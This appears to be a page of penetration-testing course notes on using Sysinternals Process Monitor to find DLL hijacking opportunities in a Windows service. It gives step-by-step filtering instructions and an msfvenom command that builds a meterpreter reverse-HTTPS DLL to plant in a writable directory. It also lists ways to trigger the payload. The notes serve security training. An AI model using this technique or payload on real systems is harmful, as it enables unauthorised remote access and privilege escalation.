<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Process Monitor</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Process Monitor</h1><br /><br /><strong>
      <h3>Prerequisite:</h3>
    </strong><br />• On Windows 7 must be installed the update <a
      href="https://support.microsoft.com/en-us/help/3004394/support-for-urgent-trusted-root-updates-for-windows-root-certificate-program-in-windows" target="_blank">KB3033929</a>,
    otherwise it will be unable to load a device driver(see here <a
      href="https://rspydir.wordpress.com/2017/05/24/solved-unable-to-load-process-monitor-device-driver/)" target="_blank">https://rspydir.wordpress.com/2017/05/24/solved-unable-to-load-process-monitor-device-driver/)</a><br /><br /><strong>
      <h3>Process Monitor(procmon)</h3>
    </strong><br /><strong>Process Monitor</strong>(<a
      href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank">Download</a>) is a tool from SysInternal
    Suite of Microsoft that can help us to <span style="text-decoration:underline;">find vulnerable applications and
      DLL&#39;s</span>.<br /><br />1. Because there are a lot of entries we have to filter for relevant results: <br />
    Filter→ Filter... OR <a href=""><img src="images/871-1.png" alt="images/871-1.png" /></a> OR CTRL+L<br /> ◇ filter
    for files(we are searching dll) not found from the applications we can apply this filter<br /> <a
      href="file://C:/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/procmon.png"><img
        src="images/871-2.png" alt="images/871-2.png" /></a><br /> ◇ filter for a specific executable<br /> <a
      href="file://C:/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/procmon2.png"><img
        src="images/871-3.png" alt="images/871-3.png" /></a><br />3. As a result we will have a blank window<br /> <a
      href=""><img src="images/871-4.png" alt="images/871-4.png" /></a><br />4. Since using Process Explorer we have
    found that our process(<span style="color:#00ff00;">AdobeUpdateService.exe</span>) is launched by a service(<span
      style="color:#a020f0;">AdobeUpdateService</span>)<br /> We have to open the <span
      style="text-decoration:underline;">Services</span> applet and find this <span
      style="color:#a020f0;">service</span><br /> <a href=""><img src="images/871-5.png"
        alt="images/871-5.png" /></a><br /> <a href=""><img src="images/871-6.png" alt="images/871-6.png" /></a><br />
    To be sure that is the service that we are searching we can check the process that it will launch<br /> <a
      href=""><img src="images/871-7.png" alt="images/871-7.png" /></a><br />5. Now we have to <span
      style="color:#ff0000;">Stop</span> and <span style="color:#ff0000;">Start</span> the service, to monitor it on
    Process Monitor<br /> <a href=""><img src="images/871-8.png" alt="images/871-8.png" /></a><br />7.Process Monitor
    have now generate a real time view of the action created by the process that we have Stop and reStarted<br /> <a
      href="file://C:/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/procmon3.png"><img
        src="images/871-9.png" alt="images/871-9.png" /></a><br />8. Stop the capture of the events <a href=""><img
        src="images/871-10.png" alt="images/871-10.png" /></a> OR CTRL+L<br /> Now we have to identify cases where the
    application is looking for a DLL in a directory which we can write to, or modify<br />9. To see the DLL loaded by
    the process we have to focus to:<br /> ◇ <strong>Operations</strong>(we can add them to the filter):<br /> ▪
    CreateFile <a href=""><img src="images/871-11.png" alt="images/871-11.png" /></a><br /> ▪ Load Image <a href=""><img
        src="images/871-12.png" alt="images/871-12.png" /></a><br />10. To check which of the DLL can be injectable we
    have to focus to<br /> ◇ <strong>Result</strong>:<br /> ▪ NAME NOT FOUND<br /> ◇ <strong>Path:</strong><br /> ▪ DLL
    that are NOT FOUND in the folder of the application but then successfully are loaded in another folder:<br /> <a
      href="file://C:/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/procmon4.png"><img
        src="images/871-13.png" alt="images/871-13.png" /></a><br />12. Drop our modified payload in the directory where
    the application has not found the dll. This directory has to be be user writable!<br /> We have to create the
    payload with msfvenom<br />
    <div class="codebox">
      <div class="codebox">
        msfvenom&nbsp;-p&nbsp;windows/x64/meterpreter/reverse_https&nbsp;LHOST=192.168.1.122&nbsp;LPORT=443&nbsp;-f&nbsp;dll&nbsp;-o&nbsp;/home/kali/Desktop/WTSAPI32.dll
      </div>
    </div><br /> <a href=""><img src="images/871-14.png" alt="images/871-14.png" /></a><br />13. Start a listening
    handler on the attacker machine<br /> <a href=""><img src="images/871-15.png"
        alt="images/871-15.png" /></a><br />15. To launch the exploitation we have different possibilities:<br /> ◇
    Restart the Service<br /> ◇ Relaunch the application<br /> ◇ Wait for the system to be rebooted (if the executable
    is associated with a service that starts at boot time)<br /> ◇ Wait that the user launch the affected
    application<br />16. Our payload is been loaded successfully!<br /> <a href=""><img src="images/871-16.png"
        alt="images/871-16.png" /></a>
  </div>
</body>

</html>